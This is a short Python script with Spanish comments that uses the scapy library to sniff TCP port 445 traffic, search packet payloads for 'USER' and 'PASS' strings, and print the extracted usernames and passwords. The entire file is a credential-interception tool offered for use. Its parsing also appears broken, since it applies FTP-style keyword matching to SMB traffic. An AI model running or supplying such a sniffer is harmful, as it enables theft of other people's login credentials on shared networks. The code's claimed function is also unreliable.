from scapy.all import *

def packet_callback(packet):
    if packet.haslayer(TCP) and packet[TCP].dport == 445:
        if packet.haslayer(Raw):
            # Filtrar paquetes que contienen datos sin procesar
            raw_data = packet[Raw].load
            # Buscar nombres de usuario y contraseñas
            if b'USER' in raw_data and b'PASS' in raw_data:
                username_index = raw_data.index(b'USER') + 5
                password_index = raw_data.index(b'PASS') + 5
                username = raw_data[username_index:].split(b'\x00')[0].decode()
                password = raw_data[password_index:].split(b'\x00')[0].decode()
                print(f"Se ha capturado un nombre de usuario: {username}, y una contraseña: {password}")

# Configurar la captura de paquetes
sniff(filter="tcp port 445", prn=packet_callback, store=0)
